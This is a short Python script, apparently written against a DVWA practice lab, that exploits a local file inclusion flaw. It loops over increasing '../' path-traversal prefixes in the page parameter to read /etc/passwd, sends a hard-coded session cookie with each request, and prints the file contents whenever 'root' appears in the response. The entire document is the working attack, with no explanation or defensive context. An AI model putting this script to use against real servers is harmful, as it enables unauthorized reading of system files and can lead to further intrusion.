import requests
import re

LFI = ["../"]

for i in LFI:
    for j in range(5):
        if(j==0):
            URL = "http://10.0.2.15:8080/vulnerabilities/fi/?page="+str(i*j)+"/etc/passwd"
        else:
            URL = "http://10.0.2.15:8080/vulnerabilities/fi/?page="+str(i*j)+"etc/passwd"
        
        cookie={
                "PHPSESSID":"mtmr8lk10mfbt9ibj827fvlrh0",
                "security":"low"
                }
 
        session1 = requests.Session()
    
        req=session1.get(URL,cookies=cookie)

        if(req.text.find("root")!=-1):
            result_parse = re.search('.*<!D',req.text,re.DOTALL)
            result = re.sub('<!D','',result_parse.group(),re.DOTALL)
            print (result)


